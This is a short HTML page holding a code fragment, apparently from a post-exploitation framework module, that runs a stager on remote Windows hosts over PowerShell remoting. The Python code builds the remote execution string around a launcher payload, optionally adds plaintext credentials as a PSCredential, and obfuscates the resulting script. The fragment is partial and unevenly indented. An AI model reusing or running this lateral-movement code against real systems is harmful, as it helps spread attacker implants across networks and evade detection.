<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>PSRemoting</title>
</head><body>Executes a stager on remote hosts using PSRemoting.<br/>
Does not need Admin<br/>
<br/>
# build the PSRemoting execution string<br/>
        computerNames = &quot;\&quot;&quot; + &quot;\&quot;,\&quot;&quot;.join(self.options['ComputerName']['Value'].split(&quot;,&quot;)) + &quot;\&quot;&quot;<br/>
        script += &quot; -ComputerName @(&quot;+computerNames+&quot;)&quot;<br/>
        script += &quot; -ScriptBlock {&quot; + launcher + &quot;}&quot;<br/>
<br/>
        if self.options[&quot;UserName&quot;]['Value'] != &quot;&quot; and self.options[&quot;Password&quot;]['Value'] != &quot;&quot;:<br/>
          # add in the user credentials<br/>
          script = &quot;$PSPassword = \&quot;&quot;+password+&quot;\&quot; | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\&quot;&quot;+userName+&quot;\&quot;,$PSPassword);&quot; + script + &quot; -Credential $Credential&quot;<br/>
<br/>
        script += &quot;;'Invoke-PSRemoting executed on &quot; +computerNames +&quot;'&quot;<br/>
      if obfuscate:<br/>
script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)</body></html>